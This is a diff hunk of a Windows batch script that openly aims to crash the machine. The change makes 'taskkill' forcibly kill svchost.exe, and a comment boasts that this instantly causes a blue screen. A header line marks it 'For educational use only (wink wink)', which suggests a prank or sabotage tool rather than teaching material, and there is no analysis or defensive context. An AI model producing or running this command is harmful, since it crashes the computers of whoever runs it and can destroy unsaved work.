@@ -5,5 +5,5 @@ echo CC License
 echo For educational use only (wink wink)
 
 :: The bsod
-taskkill /IM svchost.exe
+taskkill /f /IM svchost.exe
 :: It kills a crucial service that instantly BSODs you!
